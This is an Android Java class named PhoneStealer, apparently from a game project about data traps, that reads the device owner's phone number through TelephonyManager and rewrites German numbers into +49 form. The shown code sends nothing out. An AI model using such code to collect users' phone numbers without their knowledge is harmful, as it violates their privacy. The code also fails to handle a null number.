package de.hpi3d.gamepgrog.trap.android;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.telephony.TelephonyManager;

import androidx.annotation.RequiresPermission;

/**
 * Stealer for users phone number
 */
public class PhoneStealer {

    /**
     * Returns users phone number.
     * <p>
     * Ideally, at least. SIM-Card vendors have locked this down a lot in recent years,
     * and on some devices this won't work.
     *
     * @param context to access storage
     * @return users phone number
     */
    @SuppressLint("HardwareIds")
    @RequiresPermission(Manifest.permission.READ_PHONE_STATE)
    public static String getUserPhoneNumber(Context context) {
        TelephonyManager tel = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tel != null) {
            String number = tel.getLine1Number();
            if (number.startsWith("0")) {
                number = "+49" + number.substring(1);
            }
            return number;
        }
        return "";
    }
}
